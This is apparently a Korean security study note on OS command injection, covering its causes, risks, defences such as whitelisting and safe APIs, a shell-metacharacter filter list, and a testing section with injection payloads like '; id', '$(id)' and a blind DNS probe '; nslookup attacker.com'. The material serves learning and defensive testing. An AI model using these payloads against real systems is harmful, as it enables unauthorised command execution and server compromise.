---
title: OS Command Injection
date: 2026-03-14 00:00:00 +09:00
categories: [Web, OS Command Injection]
tag: [OS Command Injection]
---

## OS Command Injection
사용자 입력을 통해 서버에서 임의의 OS 명령어가 실행되는 취약점

### 원인
1. 입력값 검증 부족
- 사용자 입력을 필터링하거나 검증하지 않고 그대로 사용

2. OS 명령어 실행 함수 사용

    ```
    취약한 함수
    C : system(), popen()
    PHP : exec(), system(), shell_exec(), passthru()
    Python : os.system(), subprocess(..., shell=True)
    Java : Runtime.exec()
    ```

3. 명령어와 사용자 입력을 문자열로 결합
- 사용자 입력이 명령어 문자열에 직접 포함되어 추가 명령어 삽입 가능

    ```
    exec("ping " + input)
    ```

4. Shell 메타문자 해석
- 쉘이 `;, |, &` 등의 메타문자를 해석하여 추가 명령 실행 가능

### 위험도
1. 원격 코드 실행 (RCE)

2. 파일 조작 및 삭제

3. 웹셸 업로드 / 백도어 설치
- 지속적인 서버 접근 가능

4. 데이터베이스 및 데이터 탈취

5. 서버 장악
- Reverse Shell
- 권한 상승
- 내부망 공격

### 대응 방안
1. 화이트리스트 기반 입력값 검증

2. OS 명령어 직접 실행 금지 / 안전한 API 사용
- 가능하면 OS 명령어 대신 내장 라이브러리 사용
- 명령어와 인자를 분리, 사용자 입력을 그대로 전달하지 않음

    ```
    C : execv(), execvp()
    PHP : escapeshellarg(), escapeshellcmd()
    Python : subprocess.run(..., shell=False)
    Java : ProcessBuilder
    ```

3. 특수문자 필터링
- 쉘 메타문자 입력 차단

    ```
    ;
    &
    &&
    |
    ||
    `
    $
    ```

4. 최소 권한 실행
- Root/관리자 권한으로 실행 금지
- 웹 서버 계정, 애플리케이션 계정 권한 최소화

### 테스트 방법
1. 메타문자 입력 테스트

    ```
    ; id
    ; whoami
    ; ls
    ```

2. AND/OR 조건 테스트

    ```
    && id
    || id
    ```

3. Pipe 테스트

    ```
    | id
    ```

4. Backtick / Subshell 테스트

    ```
    `id`
    $(id)
    ```

5. Blind Command Injection 테스트
출력 결과가 보이지 않을 때 사용

    ```
    Time 기반
    ; sleep 5
    응답 지연 여부 확인

    DNS 기반
    ; nslookup attacker.com
    외부 서버로 DNS 요청 발생 여부 확인
    ```

6. 자동화 도구 사용
- Burp Suite
- OWASP ZAP
- Commix (Command Injection Tool)